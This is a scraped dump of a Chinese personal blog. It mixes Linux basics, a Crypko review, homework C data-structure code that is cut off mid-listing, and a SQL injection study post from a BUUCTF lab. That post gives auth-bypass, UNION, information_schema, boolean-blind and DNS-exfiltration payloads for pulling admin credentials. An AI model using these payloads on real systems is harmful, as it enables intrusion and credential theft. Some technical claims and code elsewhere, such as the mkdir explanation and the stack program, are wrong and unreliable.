test\n\n\n\n要在当前目录下创建一个名为test2的新目录，并且将用户具有写入权限，可以使用以下命令：\nmkdir -m test\n\n其中，-m选项表示创建一个具有管理员权限的目录。\n\n二，python for linuxpython是一种解释型、高级和通用的编程语言。\n语法简洁易懂，具有丰富的内置函数和第三方库，因此被广泛应用于数据科学、Web开发、游戏开发、机器学习等领域。\n它可以帮助初学者快速入门编程，并且可以帮助他们逐步提高编程技能。\n默认情况下，Linux会自带安装Python，可以运行\npython --version\n\n命令查看\n运行 Python 代码\n在 Linux 中，可以使用以下命令来运行 Python 代码：\npython3 文件名.py\n\n其中，文件名.py 是要运行的 Python 文件的名称。\n编写 Python 代码\n在 Linux 中，可以使用任何文本编辑器来编写 Python 代码。例如，可以使用 Vim 编辑器编写 Python 代码：\nvim 文件名.py\n\n\n\n在编辑器中编写完代码后，可以使用以下命令来运行 Python 代码：\npython3 文件名.py\n\n其中，文件名.py 是要运行的 Python 文件的名称。\n","categories":["入坑指南"],"tags":["linux","新人入门","ubuntu"]},{"title":"crypko？什么东西？","url":"/2023/03/29/crypko/","content":"要不是今天突然收到了crypko更新的邮件，这个网站我可能就这么忘了。。。。。。\n\n简而言之\nCrypko是由Preferred Networks, Inc.所制作的人工智能，也是其运营的网站。\nCrypko使用基于深度学习的GAN技术，可以自动生成高分辨率的角色立绘\n其实说白了就是一个AI老婆生成器\n简单展示一下\n！！注意：国内无法访问，访问需要魔法！！\n\n\n生成图片还得扣积分（积分每日签到可获得）\n\n出图效果：\n\n可以看得出来，图片质量一般，而且还有水印\n我的评价是：不如novelAI 或者直接用GPT-4\n","tags":["AI","绘画"]},{"title":"sql注入笔记","url":"/2023/03/30/sql%E6%B3%A8%E5%85%A5/","content":"首先，sql注入可以通过url(应该都知道吧)链接、表单输入等途径实现，可以使用hackbar、burp等工具（sql语句不区分大小写）\nsql语法例如：现在有一个保存在数据库中的用户名密码表\n叫allusers\n选取表格里面的所有内容：\nSELECT*FROM allusers\n\n在上面的基础上，选取指定的用户名、密码：\nWHERE username =‘admin’ AND password =&#x27;pass&#x27;\n\n最简单的sql注入：\n将上面的语句改为：\nWHERE username =‘admin&#x27;’ AND password =&#x27;pass&#x27;\n\n可见多加了一个  ‘  此条语句报错，黑客通过错误代码，可以得知sql注点\n若将语句改为这样，– 这个符号后面的被解释为注释，不执行\nWHERE username =‘admin&#x27; -- ’ AND password =&#x27;pass&#x27;\n\n注释不被执行，则可以直接通过用户名而不需要密码登陆账户，但是前提是得知道正确的用户名\n若不知道正确的用户名，该怎么办？\n由于\nWHERE username =‘admin&#x27; -- ’ AND password =&#x27;pass&#x27;\n\n此语句用 AND 连接，有个判断AND前后真假值的流程\n若是用OR连接两个条件，并且确保有一个条件永真，则整条语句被判断为真\n例如\nWHERE username =‘admin&#x27; OR 1=1 -- ’ AND password =&#x27;pass&#x27;\n\nsql里合并两个表格内容：\n用UNION 连接俩个SELECT语句，例如\nSELECT * FROM table1 UNION SELECT * FROM table2\n\n在mysql中，UNION SELECT 后面可以不加指定表格名字，直接加 NULL\n例如\nSELECT * FROM table1 UNION SELECT NULL,NULL\n\n后面加一个NULL,若是没有报错，则表明table1这个表格是一列，\n后面加俩个NULL,若是没有报错，则表明table1这个表格是俩列，\n因此，黑客可以一直用NULL测试，知道没有报错，从而得知table1 是个几列表格\n假如我现在使用下面语句进行测试\nSELECT * FROM table1 UNION SELECT **NULL,NULL**，NULL FROM allusers\n\n意思是将allusers和table1进行合并（具体怎么并目前还没搞清楚）\n但是，如果如果allusers的各个数据类型和table1不一致，则无法完成合并（UNION合并必须保证数据类型和列数一致，例如：数字和字符不是一个数据类型）\n因此，还要对数据类型进行测试，例如\nSELECT * FROM table1 UNION SELECT ‘1’ , NULL , NULL\t\t报错SELECT * FROM table1 UNION SELECT NULL , ’2‘,  NULL\t\t报错SELECT * FROM table1 UNION SELECT NULL,NULL,&#x27;3&#x27;\t\t通过\n\n则可以得知，第三列为数字\n注入：\n在可注入的地方，加入 ’ 中止数据内容，并加入注释关键词：\nSELECT * FROM table1 WHERE name=&#x27;admin&#x27; --&#x27;\n\n这时候，在中间注入UNION语句：\nSELECT * FROM table1 WHERE name=&#x27;admin&#x27;  UNION SELECT NULL,username，password FROM allusers --&#x27;\n\n一般不加保护的数据库的网站，就会将合并新内容后的表展示在页面上，这时就可以知道账户密码了\n要是有保护？该怎么办？利用cookie！cookie保存在数据库中\ncookie向服务器发展出请求，数据库利用相关语句查找cookie：\ncookie请求数据库：\ncookie:cookieid=astljs\n\n随后数据库查找存储的cookie：\nSELECT cookieid FROM allusers WHERE cookieid=&#x27;astljs&#x27;\n\n此时，可以修改cookie的值：\nSELECT cookieid FROM allusers WHERE cookieid=&#x27;astljs&#x27; --‘\n\n若页面未改变，则表示可以注入\n如果我们故意让逻辑判错：\nSELECT cookieid FROM allusers WHERE cookieid=&#x27;astljs&#x27; AND 1=0  --‘\n\n此时页面出错，可以得知查询出错时页面状态\n此时便可以不断进行调试，根据页面状态判断调试结果的对错\n利用SUBSTRING语句进行判断：\nSELECT cookieid FROM allusers WHERE cookieid=&#x27;astljs&#x27; AND SUBSTRING(&#x27;password&#x27;,1,1) =&#x27;m&#x27; --‘\n\n此语句的意思是：判断password字符串的第一个字符是否为m\n黑客可以将SUBSTRING里的第一个参数修改为一个查询语句，接下来就是不断发送请求，修改判断字符，爆破出密码：\nSELECT cookieid FROM allusers WHERE cookieid=&#x27;astljs&#x27; AND SUBSTRING(**(SELECT password FROM users WHERE user=&#x27;admin&#x27;)**,1,1) =&#x27;m&#x27; --‘....SELECT cookieid FROM allusers WHERE cookieid=&#x27;astljs&#x27; AND SUBSTRING(**(SELECT password FROM users WHERE user=&#x27;admin&#x27;)**,1,1) =&#x27;z&#x27; --‘\n\n这就是所谓的布尔注入，是一种盲注（盲注：即在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试，这个过程为盲注）\n当网站不返回页面时该怎么办呢？\n例如：向mysql注入LOAD_FILE()函数，给其提供域名，会触发DNS查询，如果在域名中动手脚，比如插入管理员密码查询语句，并且返回给黑客自己的服务器里，则可以间接得到管理员密码。\n针对上面的教学，遇到实战问题：1，在查表有几列时，不知道表的名字怎么办？注意：由于sql注入可以通过url链接进行，下面实例利可用hackbar进行，所写的sql语句是直接加在相关url链接后面的，例如：\n\n直接用order by \n例如：\norder by 2\n\n后面的数字可以自己更改来测试，此语句：按照查询结果的第三个列进行排序，实际用处就是判断相应的表的列存在与否，用1、2、3……依次试验，直到找到未响应的一个\n2，如何判断显位点？当我们找到注入点后，想找到注入后哪里会回显我的需要的信息\n举个例子\nid=-2 union select 1,2\n\n具体来说，”id&#x3D;-1”是一个无效的条件，它被用来绕过原始查询语句中的WHERE子句。”union select 1,2”是一个新的SELECT语句，它将查询的结果与原始查询的结果进行联合。在这种情况下，新查询语句返回的结果是两个值1和2。\n（下面的”id“是测试网址中的参数，由于其目的是制造无效条件，在其他不含id这个参数的网站中，只需要同样制造无效条件即可，下同）\n3，如何获取数据库名称？例如：\nid=-1 union select 1,database()\n\n“id&#x3D;-1”是注入的查询条件，通常是一个无效的条件，它将会被忽略，因为它不符合任何实际数据的过滤条件。\n“union”用于将两个或多个SELECT查询结果合并成一个结果集。\n“select 1”表示第一个查询结果为1。\n“database()”表示查询当前数据库的名称。在这个查询中，它返回的是当前数据库的名称，通常是用于确定数据库的名称，以便后续攻击。\n4，得到数据库名字后，如何获取数据表的信息？id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;news&#x27;)\n\n“news”是实例中的数据库名称\n“id&#x3D;-1”是注入的查询条件，通常是一个无效的条件，它将会被忽略，因为它不符合任何实际数据的过滤条件。\n“union”用于将两个或多个SELECT查询结果合并成一个结果集。\n“select 1”表示第一个查询结果为1。\n&quot;(select group_concat(table_name) from information_schema.tables where \n\ntable_schema&#x3D;’news’)”是一个子查询，它返回包含指定数据库中所有表名称的逗号分隔字符串。在这个查询中，它返回的是当前数据库中所有表名称的逗号分隔字符串。\n此步可得知数据表信息，例如数据表名字，得到数据表名字后，可进一步读取数据表中的字段：\nid=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;news&#x27; and table_name=&#x27;admin&#x27;)\n\n“admin”、”contents”是此实例中的表的名称\n实例中得到字段名称id、usernames、password（未放示意图）\n获取usernames的信息：\nid=-1 union select 1,(select group_concat(username) from admin)\n\n获取password信息：\nid=-1 union select 1,(select group_concat(password) from admin)\n\n得到密码！\n本实例地址：BUUCTF在线评测 (buuoj.cn) 里的basic板块下的BBUU SQL COURSE 1 1题目\n","tags":["hackbar","sql注入","mysql","黑客","cookie"]},{"title":"关于此博客","url":"/2023/03/04/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E8%AE%BE%E5%8E%86%E7%A8%8B/","content":"此博客为我的个人博客，基于hexo+github搭建，目前不需要域名，github所提供的域名足够我使用，如果你也想搭建一个博客，我推荐你也可以试试同样的方法。我搭建该博客使用的教程网址如下：\nhttps://zhuanlan.zhihu.com/p/26625249\n\n\n搭建博客前建议先了解一下：\n什么是markdown语言\n什么是github\n什么是hexo\n如何使用代理服务\nWindows命令行基础命令\n什么是图床\n最后，欢迎关注我的哔哩哔哩账号: 玄兎\n&#x2F;&#x2F;感谢你能来我的博客玩，我很高兴能与您分享我的想法和经验，希望我的博客可以为您带来有价值的信息。awa\n如果你有任何想法和建议，或者想要友联的话，请联系本人电子邮箱：&#49;&#x32;&#x30;&#x36;&#x36;&#x36;&#x31;&#52;&#51;&#52;&#64;&#x71;&#113;&#46;&#99;&#x6f;&#x6d;\n\n\n"},{"title":"数据结构算法总结","url":"/2023/03/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/","content":"一假设以带头结点的循环链表表示一个队列 并只设一个指针指向队尾元素结点，用C语言编写相应的队列初始化、入队列和出队列的算法以下是使用带头结点的循环链表表示队列的C语言代码，包括队列初始化、入队列和出队列的算法：\n// 定义队列元素结构体typedef struct node &#123;  int data;  struct node *next;&#125; Node;// 定义队列结构体typedef struct &#123;  Node *rear; // 指向队尾元素结点&#125; Queue;// 初始化队列void InitQueue(Queue *q) &#123;  q-&gt;rear = (Node *)malloc(sizeof(Node)); // 创建头结点  q-&gt;rear-&gt;next = q-&gt;rear; // 头结点的next指针指向头结点本身，表示链表为空&#125;// 入队列void EnQueue(Queue *q, int data) &#123;  Node *new_node = (Node *)malloc(sizeof(Node)); // 创建新结点  new_node-&gt;data = data;  new_node-&gt;next = q-&gt;rear-&gt;next; // 新结点的next指针指向头结点，保持循环链表特性  q-&gt;rear-&gt;next = new_node; // 队尾元素结点的next指针指向新结点  q-&gt;rear = new_node; // 更新队尾指针为新结点&#125;// 出队列int DeQueue(Queue *q) &#123;  if (q-&gt;rear-&gt;next == q-&gt;rear) &#123; // 队列为空，不能出队列    printf(&quot;Queue is empty!\\n&quot;);    return -1;  &#125;  Node *first_node = q-&gt;rear-&gt;next-&gt;next; // 获取队头元素结点  int data = first_node-&gt;data; // 保存队头元素的数据  q-&gt;rear-&gt;next-&gt;next = first_node-&gt;next; // 队头元素结点从队列中移除  if (first_node == q-&gt;rear) &#123; // 队列中只有一个元素时，出队列后队列为空    q-&gt;rear = q-&gt;rear-&gt;next; // 队尾指针指向头结点  &#125;  free(first_node); // 释放队头元素结点的内存空间  return data;&#125;\n\n二、希望循环队列中的元素都得到运用，现在需要设置一个标志域tag，以tag的值为0还是1来区分，尾指针和头指针值相同时的队列元素是空还是满，试编写与此结构相应的入队和出队算法\n以下是循环队列的入队和出队算法，使用一个标志位tag表示队列的状态，0表示队列为空，1表示队列为满。\n入队算法：void Enqueue(int* queue, int queue_size, int* rear, int* tag, int element) &#123; // 判断队列是否为满 if (*tag == 1 &amp;&amp; (*rear + 1) % queue_size == *front) &#123;  printf(&quot;Queue is full.\\n&quot;);  return; &#125; // 将元素插入队列尾 queue[*rear] = element; // 移动队列尾指针 *rear = (*rear + 1) % queue_size; // 如果队列尾指针等于队列头指针，表示队列已满 if (*rear == *front) &#123;  *tag = 1; &#125;&#125;出队算法：int Dequeue(int* queue, int queue_size, int* front, int* rear, int* tag) &#123; // 判断队列是否为空 if (*tag == 0 &amp;&amp; *front == *rear) &#123;  printf(&quot;Queue is empty.\\n&quot;);  return -1; &#125; // 取出队列头元素 int element = queue[*front]; // 移动队列头指针 *front = (*front + 1) % queue_size; // 如果队列头指针等于队列尾指针，表示队列已空 if (*front == *rear) &#123;  *tag = 0; &#125; return element;&#125;\n\n\n这里的参数说明：\nqueue：指向循环队列数组的指针queue_size：循环队列的大小front：指向队列头的指针rear：指向队列尾的指针tag：队列状态的标志位element：待入队或待出队的元素在入队算法中，首先判断队列是否为满，如果队列已满则直接返回。否则将元素插入队列尾，并将队列尾指针后移一位。如果队列头指针等于队列尾指针，表示队列已满，将标志位tag设置为1。\n在出队算法中，首先判断队列是否为空，如果队列为空则直接返回。否则取出队列头元素，并将队列头指针后移一位。如果队列头指针等于队列尾指针，表示队列已空，将标志位tag设置为0。最后返回取出的元素\n三利用线性表的顺序存储结构完成一个班级的一个学期的所有课程的管理，要求实现：增加、删除、修改学生的成绩记录等功能。线性表的长度设为全班的人数（35人），一个学期的课程设为3门，定义如下：\n#include  &lt;stdio.h&gt;#include  &lt;stdlib.h&gt;#include  &lt;string.h&gt;#define Max_length  2typedef  struct &#123;\tint  xh;         /* 学号 */\tchar  n[10];  /* 姓名 */\tint   c1, c2, c3;  /* 3门课程成绩 */&#125; Element;/* 在第i个记录的后面插入一个学生的记录算法 */int Insert_list(int i, Element s[], int* n_pointer) &#123;\t/* n_pointer存放已输入的最大记录数 */\tint j, n;\tn = *n_pointer;\tif ((n == Max_length) || (i &lt; 1) || (i &gt; n + 1)) return (0);\tfor (j = n; j &gt;= i; j--) s[j + 1] = s[j];   /* 移动 */\tprintf(&quot;Input Data for inserting（XH  Name  C1  C2  C3）\\n&quot;);\tscanf_s(&quot;%d %s %d %d %d&quot;, &amp;s[i].xh, &amp;s[i].n,20, &amp;s[i].c1, &amp;s[i].c2, &amp;s[i].c3);\tn++;  *n_pointer = n; \treturn (1);&#125;/* 删除第i个学生的记录算法 */int Delete_list(int i, Element s[], int* n_pointer) &#123;\tint j, n;\tn = *n_pointer;\tif ((i &lt; 1) || (i &gt; n))  return (0);\tfor (j = i + 1; j &lt;= n; j++) &#123; /* 移动 */\t\ts[j - 1].xh = s[j].xh; \tstrcpy_s(s[j - 1].n, s[j].n);\t\ts[j - 1].c1 = s[j].c1;  \ts[j - 1].c2 = s[j].c2; \ts[j - 1].c3 = s[j].c3;\t&#125;\tn--;  *n_pointer = n;  return (1);&#125;/* 查找学号为x算法 */int Locate_list(Element s[], int n, int x) &#123;\tint i;\tfor (i = 1; i &lt;= n; i++)  if (s[i].xh == x) return (i);\treturn (0);&#125;/* 修改学号为i的学生的记录函数 */int Change_list(int i, Element s[]) &#123;\tif ((i &lt; 1) || (i &gt; Max_length + 1)) return (0);\tprintf(&quot;Input data for updating:\\n&quot;);\tscanf_s(&quot; %d %s %d %d %d&quot;, &amp;s[i].xh, &amp;s[i].n,20, &amp;s[i].c1, &amp;s[i].c2, &amp;s[i].c3);\treturn (1);&#125;/* 打印已建立的数据记录，n是记录总数 */void Print_list(Element s[], int n) &#123;\tint i;\tif (n &gt; Max_length)return;\tprintf(&quot;   XH     Name     C1     C2     C3  \\n&quot;);\tprintf(&quot;-------------------------------------\\n&quot;);\tfor (i = 1; i &lt;= n; i++)\t\tprintf(&quot;%4d%10s%7d%7d%7d\\n&quot;, s[i].xh, s[i].n, s[i].c1, s[i].c2, s[i].c3);&#125;int main() &#123;\tElement s[Max_length];\tint i, records = 0;\tfor (i = 1; i &lt;= Max_length; i++) Insert_list(i, s, &amp;records);  /* 创建线性表 */\tPrint_list(s, records);  /* 显示学生记录内容*/\treturn 0;&#125;\n\n编译环境：\nvisual studio  2022\n四单向链表的基本操作，创建一个由六个节点组成的单向链表：能够增加、删除、查找、移动节点。\n#include  &lt;stdio.h&gt;#include  &lt;stdlib.h&gt;#include  &lt;malloc.h&gt;#define   NULL  0typedef struct Linear_chain_node &#123;\tint data;\tstruct Linear_chain_node* link;&#125;  NODE;/* 建立单链表 */NODE* Create_single_chain(int n)&#123;\tNODE* head, * p, * q;\tint i;\tp = (NODE*)malloc(sizeof(NODE));\tp-&gt;data = 0;\tp-&gt;link = NULL;\thead = p;\tfor (i = 1; i &lt;= n; i++)\t&#123;\t\tq = (NODE*)malloc(sizeof(NODE));\t\tprintf(&quot;Enter Data : &quot;); scanf(&quot; % d&quot;, &amp;q-&gt;data);\t\tq-&gt;link = NULL;  p-&gt;link = q;  p = q;\t&#125;\treturn (head);&#125;/* 单链表查找节点 */int* Found(NODE* head, int x) &#123;\tNODE* p;\tint pos = 0;\tp = head;\twhile ((p-&gt;link != NULL) &amp;&amp; (p-&gt;data != x)) &#123; p = p-&gt;link; pos++; &#125;\tif (p-&gt;link != NULL)\t\treturn pos;\telse\t\treturn (0);&#125;/* 插入新结点（第i个结点后）*/int Insert(NODE* head, int i, int x) &#123;\tNODE* p, * q;\tint j;\tif (i &lt;= 0)  return (0);\tq = head;\tj = 1;\twhile ((j &lt; i) &amp;&amp; (q != NULL)) \t&#123; q = q-&gt;link;  j++; &#125;\tif (q == NULL)  \t\treturn (0);\tp = (NODE*)malloc(sizeof(NODE));\tp-&gt;data = x;  \tp-&gt;link = q-&gt;link;  \tq-&gt;link = p;\treturn (1);&#125;/* 删除结点p的算法 */int Delete(NODE* head, NODE* p) &#123;\tNODE* q;\tif (p == head) &#123;\t\thead = head-&gt;link;\t\tfree(p);\t\treturn (1);\t&#125;\tq = head;\twhile ((q-&gt;link != p) &amp;&amp; (q-&gt;link != NULL)) q = q-&gt;link;\tif (q-&gt;link == NULL)  \t\treturn (0);\tq-&gt;link = p-&gt;link;  \tfree(p);\treturn (1);&#125;/* 求线性链表长度 */int Length(NODE* head) &#123;\tint n;\tNODE* p;\tn = 0;  \tp = head;\twhile (p != NULL) \t&#123;\t\tn++;\t\tp = p-&gt;link;\t&#125;\treturn (n);&#125;/* 将最大结点移到队尾 */void Move(NODE* head) &#123;\tNODE* p;   /* 遍历 */\tNODE* s;   /* p的前驱,末结点 */\tNODE* q;   /* 最大的结点 */\tNODE* r;   /* q的前驱 */\ts = head;  \tp = head-&gt;link;  \tq = head;\twhile (p != NULL) \t&#123;\t\tif (p-&gt;data &gt; q-&gt;data) \t\t&#123;\t\t\tr = s;  q = p;\t\t&#125;\t\ts = p;\t\tp = p-&gt;link;\t&#125;\tif (q != s) &#123;\t\tif (q == head) \t\t&#123; head = head-&gt;link; &#125;\t\telse &#123; r-&gt;link = q-&gt;link; &#125;\t\ts-&gt;link = q;  \t\tq-&gt;link = NULL;\t&#125;&#125;/* 输出链表 */void Print(NODE* head) &#123;\tNODE* p;\tp = head;\tprintf(&quot;Linear List : &quot;);\twhile (p != NULL) \t&#123; printf(&quot; % d\\t&quot;, p-&gt;data);  \tprintf(&quot;\\n&quot;); \tp = p-&gt;link; &#125;\tprintf(&quot;\\n&quot;);&#125;/* 主函数 */void main() &#123;\tNODE* head, * p, * q;\tint i, j, l, x, n;\tprintf(&quot;Enter node number for creating:&quot;);\tscanf(&quot; % d&quot;, &amp;n);    /* n=6 */\thead = Create_single_chain(n);\tPrint(head);\tprintf(&quot;Enter data for found:&quot;);\tscanf(&quot; % d&quot;, &amp;x);\ti = Found(head, x);\tif (i == 0) printf(&quot;No found node!\\n&quot;);\telse printf(&quot;Found node at position: %d\\n&quot;, i);\tprintf(&quot;Enter data and position for inserting: &quot;);\tscanf(&quot; % d % d&quot;, &amp;x, &amp;i);\tn = Insert(head, i, x);\tif (n) printf(&quot;Insert succ！\\n&quot;);\telse printf(&quot;Insert fail!\\n&quot;);\tPrint(head);\tprintf(&quot;Enter position for deleting: &quot;);\tscanf(&quot; % d&quot;, &amp;i);\tp = head;\tj = 0;\twhile (p != NULL &amp;&amp; j &lt; i) &#123; p = p-&gt;link; j++; &#125;\tif (p == NULL)  printf(&quot;Not delete\\n&quot;);\tn = Delete(head, p);\tif (n) printf(&quot;Delete succ\\n&quot;);\telse  printf(&quot;Delete fail\\n&quot;);\tPrint(head);\tl = Length(head);\tprintf(&quot;length = % d\\n&quot;, l);\tMove(head);\tprintf(&quot;Moving max data to tail : \\n&quot;);\t\tPrint(head);&#125;\n\n五用c语言建立单链表并实现：单链表的就地逆置。 将两个非递减有序单链表，合并成一个非递减链表。将两个非递减有序单链表，合并成一个非递增链表。编写一个主函数,调试上述算法\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;// 定义单链表结构体节点typedef struct ListNode &#123;    int val;    struct ListNode* next;&#125; ListNode;// 将一个数组转换为单链表ListNode* arrayToList(int arr[], int n) &#123;    if (n &lt;= 0) &#123;        return NULL;    &#125;    ListNode* head = (ListNode*)malloc(sizeof(ListNode));    head-&gt;val = arr[0];    head-&gt;next = NULL;    ListNode* cur = head;    for (int i = 1; i &lt; n; i++) &#123;        ListNode* node = (ListNode*)malloc(sizeof(ListNode));        node-&gt;val = arr[i];        node-&gt;next = NULL;        cur-&gt;next = node;        cur = node;    &#125;    return head;&#125;// 打印单链表void printList(ListNode* head) &#123;    while (head) &#123;        printf(&quot;%d &quot;, head-&gt;val);        head = head-&gt;next;    &#125;    printf(&quot;\\n&quot;);&#125;// 单链表就地逆置void reverseList(ListNode** head) &#123;    ListNode* prev = NULL;    ListNode* cur = *head;    while (cur != NULL) &#123;        ListNode* next = cur-&gt;next;        cur-&gt;next = prev;        prev = cur;        cur = next;    &#125;    *head = prev;&#125;// 合并两个非递减有序单链表成一个非递减有序单链表ListNode* mergeListsAsc(ListNode* l1, ListNode* l2) &#123;    ListNode* dummy = (ListNode*)malloc(sizeof(ListNode));    dummy-&gt;val = 0;    dummy-&gt;next = NULL;    ListNode* cur = dummy;    while (l1 != NULL &amp;&amp; l2 != NULL) &#123;        if (l1-&gt;val &lt;= l2-&gt;val) &#123;            cur-&gt;next = l1;            l1 = l1-&gt;next;        &#125;        else &#123;            cur-&gt;next = l2;            l2 = l2-&gt;next;        &#125;        cur = cur-&gt;next;    &#125;    if (l1 != NULL) &#123;        cur-&gt;next = l1;    &#125;    if (l2 != NULL) &#123;        cur-&gt;next = l2;    &#125;    return dummy-&gt;next;&#125;// 合并两个非递减有序单链表成一个非递增有序单链表ListNode* mergeListsDesc(ListNode* l1, ListNode* l2) &#123;    ListNode* dummy = (ListNode*)malloc(sizeof(ListNode));    dummy-&gt;val = 0;    dummy-&gt;next = NULL;    ListNode* cur = dummy;    while (l1 != NULL &amp;&amp; l2 != NULL) &#123;        if (l1-&gt;val &gt;= l2-&gt;val) &#123;            cur-&gt;next = l1;            l1 = l1-&gt;next;        &#125;        else &#123;            cur-&gt;next = l2;            l2 = l2-&gt;next;        &#125;        cur = cur-&gt;next;    &#125;    if (l1 != NULL) &#123;        cur-&gt;next = l1;    &#125;    if (l2 != NULL) &#123;        cur-&gt;next = l2;    &#125;    reverseList(&amp;dummy-&gt;next);    return dummy-&gt;next;&#125;int main() &#123;    int arr1[] = &#123; 1, 3, 5 &#125;;    int arr2[] = &#123; 2, 4, 6 &#125;;    ListNode* l1 = arrayToList(arr1, 3);    ListNode* l2 = arrayToList(arr2, 3);    printf(&quot;l1: &quot;);    printList(l1);    printf(&quot;l2: &quot;);    printList(l2);    ListNode* mergedAsc = mergeListsAsc(l1, l2);    printf(&quot;merged in ascending order: &quot;);    printList(mergedAsc);    l1 = arrayToList(arr1, 3);    l2 = arrayToList(arr2, 3);    ListNode* mergedDesc = mergeListsDesc(l1, l2);    printf(&quot;merged in descending order: &quot;);    printList(mergedDesc);    return 0;&#125;\n\n解析：\n&#x2F;&#x2F; 将一个数组转换为单链表&#x2F;&#x2F;\n这段代码定义了一个函数arrayToList()，其目的是将输入的数组转换为链表。函数接收两个参数：一个整数数组arr和一个表示arr长度的整数n。\n首先，如果n小于等于0，那么函数返回空指针NULL，否则它会创建一个新的链表头节点，并将数组的第一个元素值存储到头节点的val成员中，将头节点的next指针设置为空指针。\n然后，函数使用一个循环遍历数组中的剩余元素。在每次循环中，创建一个新的链表节点，并将当前元素的值存储到该节点的val成员中。将新节点的next指针设置为空指针，并将当前节点的next指针指向该新节点。最后，将当前节点更新为新节点，以便用于下一次循环。\n当循环结束后，函数返回链表的头节点。这样，通过调用该函数并传入适当的参数，就可以将一个整数数组转换成一个链表。\nQ:(ListNode*)malloc(sizeof(ListNode));这行是什么意思\n**A:**这行代码使用了C语言中的动态内存分配函数malloc()，它在堆上分配了一块大小为sizeof(ListNode)的内存空间，并返回该内存块的起始地址。ListNode*表示这是一个指向ListNode类型对象的指针，因此该代码行创建了一个新的ListNode类型的对象，并将其地址存储在指针变量中。\n六利用栈实现数据的分类，要求当输入为偶数时进栈1，当输入为奇数时进栈2，最后分别从栈1和栈2输出偶数和奇数序列。&#x2F;2023&#x2F;4&#x2F;24\n#include&lt;stdio.h&gt;#include &lt;intrin.h&gt;typedef struct Stack &#123;    int* data;    int top, size;&#125; Stack;void push(Stack* s, int x)//入栈算法&#123;    if (s-&gt;top &lt; s-&gt;size)    &#123;        s-&gt;top = s-&gt;top + 1;        s-&gt;data[s-&gt;top] = x;    &#125;    else printf(&quot;OVERFLOW&quot;);&#125;int pop(Stack* s)//出栈算法&#123;    if (s-&gt;top &gt; 0)    &#123;        s-&gt;top = s-&gt;top - 1;        return s-&gt;data[s-&gt;top + 1];    &#125;    else    &#123;        printf(&quot;UNDERFLOW&quot;);        return -1; // 出错返回-1    &#125;&#125;void Print(Stack* s) // 输出栈中所有元素&#123;    for (int i = 1; i &lt;= s-&gt;top; i++)    &#123;        printf(&quot;%d &quot;, s-&gt;data[i]);    &#125;    printf(&quot;\\n&quot;);&#125;int main()&#123;    Stack even_stack, odd_stack;    even_stack.top = 0;    odd_stack.top = 0;    even_stack.size = 100;    odd_stack.size = 100;    even_stack.data = (int*)malloc(even_stack.size * sizeof(int));    odd_stack.data = (int*)malloc(odd_stack.size * sizeof(int));    int n;    printf(&quot;请输入一组数 (输入0以结束):\\n&quot;);    scanf_s(&quot;%d&quot;, &amp;n);    while (n != 0)    &#123;        if (n % 2 == 0)            push(&amp;even_stack, 1);        else            push(&amp;odd_stack, 2);        scanf_s(&quot;%d&quot;, &amp;n);    &#125;    printf(&quot;偶数栈： &quot;);    Print(&amp;even_stack);    printf(&quot;奇数栈： &quot;);    Print(&amp;odd_stack);    free(even_stack.data);    free(odd_stack.data);    return 0;&#125;\n\n七Dijkstra algorithm 迪杰斯特拉算法 \n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define MAX_V 100struct Edge &#123;    int src, dst;    int weight;&#125;;struct Graph &#123;    int V;    struct Edge* edges;&#125;;void init_graph(struct Graph* graph, int V) &#123;    graph-&gt;V = V;    graph-&gt;edges = (struct Edge*)malloc(sizeof(struct Edge) * V * V);&#125;void add_edge(struct Graph* graph, int src, int dst, int weight) &#123;    graph-&gt;edges[src * graph-&gt;V + dst].src = src;    graph-&gt;edges[src * graph-&gt;V + dst].dst = dst;    graph-&gt;edges[src * graph-&gt;V + dst].weight = weight;&#125;void dijkstra(struct Graph* graph, int src) &#123;    int* dist = (int*)malloc(sizeof(int) * graph-&gt;V);    int* prev = (int*)malloc(sizeof(int) * graph-&gt;V);    for (int i = 0; i &lt; graph-&gt;V; i++) &#123;        dist[i] = INT_MAX;        prev[i] = -1;    &#125;    dist[src] = 0;    while (1) &#123;        int u = -1;        for (int i = 0; i &lt; graph-&gt;V; i++) &#123;            if (dist[i] &lt; INT_MAX &amp;&amp; (u == -1 || dist[i] &lt; dist[u])) &#123;                u = i;            &#125;        &#125;        if (u == -1) &#123;            break;        &#125;        for (int i = 0; i &lt; graph-&gt;V; i++) &#123;            if (dist[i] &gt; dist[u] + graph-&gt;edges[u * graph-&gt;V + i].weight) &#123;                dist[i] = dist[u] + graph-&gt;edges[u * graph-&gt;V + i].weight;                prev[i] = u;            &#125;        &#125;    &#125;    for (int i = 0; i &lt; graph-&gt;V; i++) &#123;        printf(&quot;The shortest distance from %d to %d is %d\\n&quot;, src, i, dist[i]);    &#125;    free(dist);    free(prev);&#125;int main() &#123;    struct Graph graph;    init_graph(&amp;graph, 5);    add_edge(&amp;graph, 0, 1, 4);    add_edge(&amp;graph, 0, 2, 1);    add_edge(&amp;graph, 1, 2, 2);    add_edge(&amp;graph, 1, 3, 7);    add_edge(&amp;graph, 2, 3, 9);    add_edge(&amp;graph, 3, 4, 2);    dijkstra(&amp;graph, 0);    return 0;&#125;\n\n八实验：最短路径利用图的最短路径原理为用户提供路径咨询，掌握求最短路径的算法并编程实现设计一个旅游景点导游模拟程序，为来访的客人提供景点最短路径的信息查询服务，任意选取n个城市，构成一个有向带权图，图中顶点表示城市，边上的权值表示两点间的距离，根据用户指定的始点和终点输出相应的最短路径\n&#x2F;2023&#x2F;5 22\n#include &lt;stdio.h&gt;#include &lt;limits.h&gt;#define MAX_VERTICES 100int graph[MAX_VERTICES][MAX_VERTICES];int dist[MAX_VERTICES];int visited[MAX_VERTICES];void dijkstra(int start, int end, int num_vertices) &#123;    // 初始化距离数组和访问标记数组    for (int i = 0; i &lt; num_vertices; i++) &#123;        dist[i] = INT_MAX;        visited[i] = 0;    &#125;    // 起点到自身的距离为0    dist[start] = 0;    // 进行n-1次循环（n为顶点数），每次找出一个距离起点最近的未访问顶点，并更新它的邻接顶点的距离    for (int i = 0; i &lt; num_vertices - 1; i++) &#123;        int min_dist = INT_MAX;        int u;        // 找出一个距离起点最近的未访问顶点        for (int j = 